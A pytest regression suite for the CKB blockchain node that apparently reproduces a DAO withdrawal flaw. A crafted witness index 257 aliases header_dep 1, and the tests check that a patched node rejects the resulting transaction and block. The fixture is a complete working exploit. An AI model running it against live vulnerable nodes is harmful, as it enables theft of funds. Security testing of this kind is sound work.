import json
import os
import shlex
import tempfile
import time

import pytest

from framework.basic import CkbTest
from framework.config import MINER_PRIVATE_1
from framework.test_node import CkbNodeConfigPath
from framework.util import ckb_hasher, get_project_root, run_command


CKB = 100_000_000
SIGHASH_TYPE_HASH = "0x9bd7e06f3ecf4be0f2fcd2188b23f1b9fcc88e5d4b65a8637b17723bbda3cce8"


def _hex_u64_le(value):
    return value.to_bytes(8, "little").hex()


def _hex_u32_le(value):
    return value.to_bytes(4, "little").hex()


def _format_ckb(shannons):
    sign = "-" if shannons < 0 else ""
    value = abs(shannons)
    whole, fractional = divmod(value, CKB)
    return f"{sign}{whole}.{fractional:08d}"


def _capacity_summary(shannons):
    return f"{shannons}shannon/{_format_ckb(shannons)}CKB"


def _bytes_field(hex_data):
    data = hex_data[2:] if hex_data.startswith("0x") else hex_data
    return _hex_u32_le(len(data) // 2) + data


def _witness_args(lock="0x", input_type_index=None):
    fields = []
    fields.append(_bytes_field(lock) if lock != "0x" else "")
    if input_type_index is None:
        fields.append("")
    else:
        fields.append(_bytes_field("0x" + _hex_u64_le(input_type_index)))
    fields.append("")

    offset = 4 + 4 * len(fields)
    offsets = []
    for field in fields:
        offsets.append(offset)
        offset += len(field) // 2
    return (
        "0x"
        + _hex_u32_le(offset)
        + "".join(_hex_u32_le(v) for v in offsets)
        + "".join(fields)
    )


def _script_hash(script):
    args = script.get("args", "0x")[2:]
    hash_type = {"data": 0, "type": 1, "data1": 2, "data2": 4}[script["hash_type"]]
    code_hash = script["code_hash"][2:]
    args_field = _bytes_field(args)
    offset0 = 16
    offset1 = offset0 + 32
    offset2 = offset1 + 1
    total = offset2 + len(args_field) // 2
    raw = (
        _hex_u32_le(total)
        + _hex_u32_le(offset0)
        + _hex_u32_le(offset1)
        + _hex_u32_le(offset2)
        + code_hash
        + f"{hash_type:02x}"
        + args_field
    )
    hasher = ckb_hasher()
    hasher.update(bytes.fromhex(raw))
    return "0x" + hasher.hexdigest()


def _out_point_bytes(out_point):
    return (
        out_point["tx_hash"][2:]
        + int(out_point["index"], 16).to_bytes(4, "little").hex()
    )


def _find_genesis_deps(client):
    consensus = client.get_consensus()
    genesis_hash = client.get_block_hash("0x0")
    genesis = client.get_block(genesis_hash, "0x2")

    dao_out_point = None
    sighash_code_out_point = None
    for tx in genesis["transactions"]:
        for index, output in enumerate(tx["outputs"]):
            type_script = output.get("type")
            if not type_script:
                continue
            type_hash = _script_hash(type_script)
            out_point = {"tx_hash": tx["hash"], "index": hex(index)}
            if type_hash == consensus["dao_type_hash"]:
                dao_out_point = out_point
            if type_hash == consensus["secp256k1_blake160_sighash_all_type_hash"]:
                sighash_code_out_point = out_point

    assert dao_out_point is not None, "genesis DAO system cell not found"
    assert sighash_code_out_point is not None, "genesis sighash system cell not found"

    sighash_marker = _out_point_bytes(sighash_code_out_point)
    sighash_dep_group = None
    for tx in genesis["transactions"]:
        for index, data in enumerate(tx["outputs_data"]):
            if sighash_marker in data[2:]:
                sighash_dep_group = {"tx_hash": tx["hash"], "index": hex(index)}
                break
        if sighash_dep_group is not None:
            break

    assert sighash_dep_group is not None, "sighash dep group not found"
    return dao_out_point, sighash_dep_group


def _account_lock(account):
    return {
        "code_hash": SIGHASH_TYPE_HASH,
        "hash_type": "type",
        "args": account["lock_arg"],
    }


def _dao_type_script(client):
    return {
        "code_hash": client.get_consensus()["dao_type_hash"],
        "hash_type": "type",
        "args": "0x",
    }


def _cell_dep(out_point, dep_type):
    return {"out_point": out_point, "dep_type": dep_type}


def _sign_transaction(tx, private_key, account, input_type_indexes, api_url):
    tx_to_sign = json.loads(json.dumps(tx))
    tx_to_sign["witnesses"] = [
        _witness_args(input_type_index=index) for index in input_type_indexes
    ]
    cli = f"cd {get_project_root()}/source && ./ckb-cli"

    with tempfile.TemporaryDirectory() as tmp_dir:
        tx_file = os.path.join(tmp_dir, "tx.json")
        key_file = os.path.join(tmp_dir, "account.private")
        with open(tx_file, "w") as f:
            json.dump(
                {
                    "transaction": tx_to_sign,
                    "multisig_configs": {
                        account["lock_arg"]: {
                            "sighash_addresses": [account["address"]["testnet"]],
                            "require_first_n": 0,
                            "threshold": 1,
                        }
                    },
                    "signatures": {},
                },
                f,
            )
        with open(key_file, "w") as f:
            f.write(private_key)

        output = run_command(
            "export API_URL={api_url} && {cli} tx sign-inputs "
            "--privkey-path {key_file} --tx-file {tx_file} --output-format json".format(
                api_url=shlex.quote(api_url),
                cli=cli,
                key_file=shlex.quote(key_file),
                tx_file=shlex.quote(tx_file),
            )
        )

    signature = json.loads(output)[0]["signature"]
    witnesses = []
    for input_index, type_index in enumerate(input_type_indexes):
        lock = signature if input_index == 0 else "0x"
        witnesses.append(_witness_args(lock=lock, input_type_index=type_index))
    signed = json.loads(json.dumps(tx))
    signed["witnesses"] = witnesses
    return signed


def _build_base_tx(
    cell_deps, inputs, outputs, outputs_data, header_deps=None, since=None
):
    tx_inputs = []
    for input_cell in inputs:
        tx_inputs.append(
            {
                "previous_output": input_cell,
                "since": since if since is not None else "0x0",
            }
        )
    return {
        "version": "0x0",
        "cell_deps": cell_deps,
        "header_deps": header_deps or [],
        "inputs": tx_inputs,
        "outputs": outputs,
        "outputs_data": outputs_data,
        "witnesses": ["0x" for _ in tx_inputs],
    }


def _first_live_cell(client, lock_script, min_capacity):
    search_key = {
        "script": lock_script,
        "script_type": "lock",
        "filter": {
            "output_data_len_range": ["0x0", "0x1"],
            "output_capacity_range": [hex(min_capacity), "0xffffffffffffffff"],
        },
    }
    cells = client.get_cells(search_key, "asc", "0x40", None)["objects"]
    for cell in cells:
        if cell["output"].get("type") is None:
            return cell
    raise AssertionError("no plain live cell with enough capacity")


def _lock_capacity(client, lock_script):
    return int(
        client.get_cells_capacity(
            {
                "script": lock_script,
                "script_type": "lock",
            }
        )["capacity"],
        16,
    )


def _block_template_to_submit_block(block, version="0x0"):
    block["transactions"].insert(0, block["cellbase"])
    block["transactions"] = [tx["data"] for tx in block["transactions"]]
    return {
        "header": {
            "compact_target": block["compact_target"],
            "dao": block["dao"],
            "epoch": block["epoch"],
            "extra_hash": "0x0000000000000000000000000000000000000000000000000000000000000000",
            "nonce": "0x0",
            "number": block["number"],
            "parent_hash": block["parent_hash"],
            "proposals_hash": "0x0000000000000000000000000000000000000000000000000000000000000000",
            "timestamp": block["current_time"],
            "transactions_root": "0x0000000000000000000000000000000000000000000000000000000000000000",
            "version": version,
        },
        "extension": block["extension"],
        "uncles": [],
        "transactions": block["transactions"],
        "proposals": block["proposals"],
    }


def _mine_with_template_time(node):
    block = node.getClient().get_block_template()
    node.getClient().submit_block(
        block["work_id"], _block_template_to_submit_block(block, "0x0")
    )
    for _ in range(100):
        pool_info = node.getClient().tx_pool_info()
        tip_number = node.getClient().get_tip_block_number()
        if int(pool_info["tip_number"], 16) == tip_number:
            return
        time.sleep(1)
    raise AssertionError("pool_info not eq tip number")


def _mine_until_committed(miner, node, tx_hash):
    for _ in range(100):
        tx_response = node.getClient().get_transaction(tx_hash)
        if tx_response["tx_status"]["status"] == "committed":
            return tx_response
        if tx_response["tx_status"]["status"] in {"pending", "proposed", "unknown"}:
            _mine_with_template_time(node)
            time.sleep(1)
            continue
        raise AssertionError(
            "unexpected tx status: "
            f"{tx_response['tx_status']['status']} {tx_response['tx_status']['reason']}"
        )
    raise AssertionError(f"tx was not committed: {tx_hash}")


def _wait_economic_state(miner, node, block_hash, max_blocks=50):
    for _ in range(max_blocks):
        state = node.getClient().get_block_economic_state(block_hash)
        if state is not None:
            return state
        _mine_with_template_time(node)
    raise AssertionError(f"economic state for block {block_hash} was not finalized")


def _absolute_epoch_since(epoch_number):
    return hex((0x20 << 56) | (1 << 40) | epoch_number)


def _transaction_status(client, tx_hash):
    tx = client.get_transaction(tx_hash)
    if tx is None:
        return "unknown"
    return tx["tx_status"]["status"]


def _wait_transaction_not_accepted(client, tx_hash, wait_seconds=20):
    status = "unknown"
    for _ in range(wait_seconds):
        status = _transaction_status(client, tx_hash)
        if status in {"pending", "proposed", "committed"}:
            return status
        time.sleep(1)
    return status


def _wait_block_absent(client, block_hash, wait_seconds=20):
    block = None
    for _ in range(wait_seconds):
        block = client.get_block(block_hash, "0x2")
        if block is not None:
            return block
        time.sleep(1)
    return block


def test_witness_input_type_257_aliases_header_dep_1_low_byte():
    witness = _witness_args(input_type_index=257)
    assert _hex_u64_le(257) == "0101000000000000"
    assert bytes.fromhex(_hex_u64_le(257))[0] == 1
    assert witness.endswith("080000000101000000000000")


class TestDaoLowByteHeaderDepIndex(CkbTest):
    @classmethod
    def setup_class(cls):
        cls.vulnerable_node_path = CkbNodeConfigPath(
            "source/template/ckb/v200/ckb.toml.j2",
            "source/template/ckb/v200/ckb-miner.toml.j2",
            "source/template/specs/mainnet.toml.j2",
            "download/0.206.0",
        )
        cls.fixed_node_path = CkbNodeConfigPath(
            "source/template/ckb/v200/ckb.toml.j2",
            "source/template/ckb/v200/ckb-miner.toml.j2",
            "source/template/specs/mainnet.toml.j2",
            "download/security",
        )
        cls.vulnerable_node = None
        cls.fixed_node = None

    @classmethod
    def _start_nodes(cls):
        cls.vulnerable_node = cls.CkbNode.init_dev_by_port(
            cls.vulnerable_node_path,
            "poc/DaoLowByteHeaderDepIndexFixed/vulnerable",
            8148,
            8248,
        )
        cls.vulnerable_node.clean()
        cls.vulnerable_node.prepare()
        cls.vulnerable_node.start()

        cls.fixed_node = cls.CkbNode.init_dev_by_port(
            cls.fixed_node_path,
            "poc/DaoLowByteHeaderDepIndexFixed/fixed",
            8149,
            8249,
        )
        cls.fixed_node.clean()
        cls.fixed_node.prepare()
        cls.fixed_node.start()

        cls.vulnerable_node.connected(cls.fixed_node)
        cls.fixed_node.connected(cls.vulnerable_node)
        cls.node = cls.vulnerable_node
        cls.node_security = cls.fixed_node

    @classmethod
    def teardown_class(cls):
        for node in (cls.vulnerable_node, cls.fixed_node):
            if node is not None:
                node.stop()
                node.clean()

    def setup_method(self, method):
        super().setup_method(method)
        self.__class__._start_nodes()

    def teardown_method(self, method):
        try:
            super().teardown_method(method)
        finally:
            for node in (self.vulnerable_node, self.fixed_node):
                if node is not None:
                    node.stop()
                    node.clean()
            self.__class__.vulnerable_node = None
            self.__class__.fixed_node = None

    def _ensure_connected(self):
        if self.vulnerable_node.get_connected_count() == 0:
            self.vulnerable_node.connected(self.fixed_node)
        if self.fixed_node.get_connected_count() == 0:
            self.fixed_node.connected(self.vulnerable_node)

    def _sync_fixed_to_vulnerable_tip(self):
        tip_number = self.vulnerable_node.getClient().get_tip_block_number()
        self.Node.wait_node_height(self.fixed_node, tip_number, 120)

    def _build_dao_low_byte_fixture(self, node):
        client = node.getClient()
        account = self.Ckb_cli.util_key_info_by_private_key(
            self.Config.ACCOUNT_PRIVATE_1
        )
        miner_account = self.Ckb_cli.util_key_info_by_private_key(MINER_PRIVATE_1)
        lock = _account_lock(account)
        miner_lock = _account_lock(miner_account)
        dao_out_point, sighash_dep_group = _find_genesis_deps(client)
        cell_deps = [
            _cell_dep(sighash_dep_group, "dep_group"),
            _cell_dep(dao_out_point, "code"),
        ]
        dao_type = _dao_type_script(client)

        deposit_capacity = 100_000 * CKB
        input_cell = _first_live_cell(client, lock, deposit_capacity + 1_000 * CKB)
        input_capacity = int(input_cell["output"]["capacity"], 16)
        deposit_fee = 1_000_000
        phase1_fee = 1_000_000
        withdraw_fee = 1_000_000
        change_capacity = input_capacity - deposit_capacity - deposit_fee

        deposit_tx = _build_base_tx(
            cell_deps,
            [input_cell["out_point"]],
            [
                {
                    "capacity": hex(deposit_capacity),
                    "lock": lock,
                    "type": dao_type,
                },
                {"capacity": hex(change_capacity), "lock": lock},
            ],
            ["0x0000000000000000", "0x"],
        )
        deposit_tx = _sign_transaction(
            deposit_tx,
            self.Config.ACCOUNT_PRIVATE_1,
            account,
            [None],
            client.url,
        )
        deposit_hash = client.send_transaction(deposit_tx)
        deposit_status = _mine_until_committed(self.Miner, node, deposit_hash)
        deposit_block_hash = deposit_status["tx_status"]["block_hash"]
        deposit_block = client.get_block(deposit_block_hash, "0x2")
        deposit_block_number = int(deposit_block["header"]["number"], 16)

        phase1_tx = _build_base_tx(
            cell_deps,
            [
                {"tx_hash": deposit_hash, "index": "0x0"},
                {"tx_hash": deposit_hash, "index": "0x1"},
            ],
            [
                {
                    "capacity": hex(deposit_capacity),
                    "lock": lock,
                    "type": dao_type,
                },
                {"capacity": hex(change_capacity - phase1_fee), "lock": lock},
            ],
            ["0x" + _hex_u64_le(deposit_block_number), "0x"],
            header_deps=[deposit_block_hash],
        )
        phase1_tx = _sign_transaction(
            phase1_tx,
            self.Config.ACCOUNT_PRIVATE_1,
            account,
            [0, None],
            client.url,
        )
        phase1_hash = client.send_transaction(phase1_tx)
        phase1_status = _mine_until_committed(self.Miner, node, phase1_hash)
        withdrawing_block_hash = phase1_status["tx_status"]["block_hash"]
        withdrawing_block = client.get_block(withdrawing_block_hash, "0x2")
        withdrawing_block_number = int(withdrawing_block["header"]["number"], 16)

        client.generate_epochs("0xb6")
        while client.get_tip_block_number() < 270:
            _mine_with_template_time(node)

        true_max = int(
            client.calculate_dao_maximum_withdraw(
                {"tx_hash": deposit_hash, "index": "0x0"}, withdrawing_block_hash
            ),
            16,
        )

        genesis_hash = client.get_block_hash("0x0")
        filler = []
        for number in range(client.get_tip_block_number(), -1, -1):
            block_hash = client.get_block_hash(hex(number))
            if block_hash in {withdrawing_block_hash, deposit_block_hash, genesis_hash}:
                continue
            filler.append(block_hash)
            if len(filler) == 255:
                break
        assert len(filler) == 255
        header_deps = (
            [withdrawing_block_hash, deposit_block_hash] + filler + [genesis_hash]
        )
        assert len(header_deps) == 258
        assert header_deps[1] == deposit_block_hash
        assert header_deps[257] == genesis_hash

        attack_since = _absolute_epoch_since(
            int(client.get_current_epoch()["number"], 16)
        )

        normal_tx = _build_base_tx(
            cell_deps,
            [{"tx_hash": phase1_hash, "index": "0x0"}],
            [{"capacity": hex(true_max - withdraw_fee), "lock": lock}],
            ["0x"],
            header_deps=header_deps,
            since=attack_since,
        )
        normal_tx = _sign_transaction(
            normal_tx,
            self.Config.ACCOUNT_PRIVATE_1,
            account,
            [1],
            client.url,
        )

        attack_tx = _build_base_tx(
            cell_deps,
            [{"tx_hash": phase1_hash, "index": "0x0"}],
            [{"capacity": hex(true_max), "lock": lock}],
            ["0x"],
            header_deps=header_deps,
            since=attack_since,
        )
        attack_tx = _sign_transaction(
            attack_tx,
            self.Config.ACCOUNT_PRIVATE_1,
            account,
            [257],
            client.url,
        )
        return {
            "account": account,
            "attack_tx": attack_tx,
            "deposit_block_hash": deposit_block_hash,
            "deposit_block_number": deposit_block_number,
            "deposit_capacity": deposit_capacity,
            "deposit_fee": deposit_fee,
            "deposit_hash": deposit_hash,
            "genesis_hash": genesis_hash,
            "header_deps": header_deps,
            "input_capacity": input_capacity,
            "input_out_point": input_cell["out_point"],
            "lock": lock,
            "miner_account": miner_account,
            "miner_lock": miner_lock,
            "normal_tx": normal_tx,
            "phase1_fee": phase1_fee,
            "phase1_hash": phase1_hash,
            "true_max": true_max,
            "withdraw_fee": withdraw_fee,
            "withdrawing_block_hash": withdrawing_block_hash,
            "withdrawing_block_number": withdrawing_block_number,
        }

    def test_01_normal_dao_withdraw_succeeds_on_fixed_node(self):
        client = self.fixed_node.getClient()
        fixture = self._build_dao_low_byte_fixture(self.fixed_node)

        attacker_before = _lock_capacity(client, fixture["lock"])
        normal_hash = client.send_transaction(fixture["normal_tx"])
        normal_status = _mine_until_committed(self.Miner, self.fixed_node, normal_hash)
        attacker_after = _lock_capacity(client, fixture["lock"])
        normal_attacker_profit = (
            fixture["true_max"] - fixture["withdraw_fee"] - fixture["deposit_capacity"]
        )
        attacker_delta = attacker_after - attacker_before

        assert normal_status["tx_status"]["status"] == "committed"
        assert attacker_delta == normal_attacker_profit
        print(
            "\n".join(
                [
                    "dao_normal_withdraw_summary:",
                    "  formula.normal_attacker_profit = true_max - phase2_fee - deposit_capacity",
                    "    = "
                    f"{_capacity_summary(fixture['true_max'])} - "
                    f"{_capacity_summary(fixture['withdraw_fee'])} - "
                    f"{_capacity_summary(fixture['deposit_capacity'])}"
                    f" = {_capacity_summary(normal_attacker_profit)}",
                    "  formula.attacker_balance_delta = attacker_after - attacker_before",
                    "    = "
                    f"{_capacity_summary(attacker_after)} - "
                    f"{_capacity_summary(attacker_before)}"
                    f" = {_capacity_summary(attacker_delta)}",
                    f"  tx.deposit={fixture['deposit_hash']}",
                    f"  tx.phase1={fixture['phase1_hash']}",
                    f"  tx.phase2_normal={normal_hash}",
                    "  blocks="
                    f"deposit={fixture['deposit_block_number']}:{fixture['deposit_block_hash']}, "
                    f"withdraw={fixture['withdrawing_block_number']}:{fixture['withdrawing_block_hash']}, "
                    f"normal={int(normal_status['tx_status']['block_number'], 16)}:"
                    f"{normal_status['tx_status']['block_hash']}",
                ]
            )
        )
        self.did_pass = True

    def test_02_fixed_node_rejects_abnormal_send_transaction(self):
        client = self.fixed_node.getClient()
        fixture = self._build_dao_low_byte_fixture(self.fixed_node)

        with pytest.raises(Exception) as error:
            client.send_transaction(fixture["attack_tx"])

        assert "Error:" in str(error.value)
        print(
            "\n".join(
                [
                    "dao_abnormal_send_rejected:",
                    "  abnormal_witness_input_type=257, header_deps[1]=true_deposit, header_deps[257]=genesis",
                    "  formula.attacker_extra_after_fix = 0 because abnormal tx is rejected before entering tx-pool",
                    "  formula.miner_extra_after_fix = 0 because rejected tx cannot become block fee",
                    f"  reject_error={error.value}",
                ]
            )
        )
        self.did_pass = True

    def test_03_fixed_node_rejects_synced_abnormal_transaction(self):
        self._ensure_connected()
        source_client = self.vulnerable_node.getClient()
        fixed_client = self.fixed_node.getClient()
        fixture = self._build_dao_low_byte_fixture(self.vulnerable_node)
        self._sync_fixed_to_vulnerable_tip()

        try:
            attack_hash = source_client.send_transaction(fixture["attack_tx"])
        except Exception as error:
            pytest.skip(
                f"source node rejected abnormal tx, cannot exercise tx sync: {error}"
            )

        source_status = _transaction_status(source_client, attack_hash)
        fixed_status = _wait_transaction_not_accepted(fixed_client, attack_hash)

        assert source_status in {"pending", "proposed"}
        assert fixed_status in {"unknown", "rejected"}
        print(
            "\n".join(
                [
                    "dao_abnormal_tx_sync_rejected:",
                    f"  tx.phase2_attack={attack_hash}",
                    f"  source_status={source_status}",
                    f"  fixed_status={fixed_status}",
                    "  formula.synced_attacker_extra_after_fix = 0 because fixed node never accepts the tx",
                    "  formula.synced_miner_extra_after_fix = 0 because fixed node never mines/proposes the tx",
                ]
            )
        )
        self.did_pass = True

    def test_04_fixed_node_rejects_synced_abnormal_block(self):
        self._ensure_connected()
        source_client = self.vulnerable_node.getClient()
        fixed_client = self.fixed_node.getClient()
        fixture = self._build_dao_low_byte_fixture(self.vulnerable_node)
        self._sync_fixed_to_vulnerable_tip()

        try:
            attack_hash = source_client.send_transaction(fixture["attack_tx"])
        except Exception as error:
            pytest.skip(
                f"source node rejected abnormal tx, cannot exercise block sync: {error}"
            )

        attack_status = _mine_until_committed(
            self.Miner, self.vulnerable_node, attack_hash
        )
        attack_block_hash = attack_status["tx_status"]["block_hash"]
        attack_block_number = int(attack_status["tx_status"]["block_number"], 16)
        fixed_block = _wait_block_absent(fixed_client, attack_block_hash)
        fixed_tx_status = _transaction_status(fixed_client, attack_hash)

        assert fixed_block is None
        assert fixed_tx_status != "committed"
        print(
            "\n".join(
                [
                    "dao_abnormal_block_sync_rejected:",
                    f"  tx.phase2_attack={attack_hash}",
                    f"  source_attack_block={attack_block_number}:{attack_block_hash}",
                    f"  fixed_has_attack_block={fixed_block is not None}",
                    f"  fixed_tx_status={fixed_tx_status}",
                    "  formula.block_sync_attacker_extra_after_fix = 0 because fixed chain rejects the block",
                    "  formula.block_sync_miner_extra_after_fix = 0 because fixed chain does not finalize the abnormal fee",
                ]
            )
        )
        self.did_pass = True
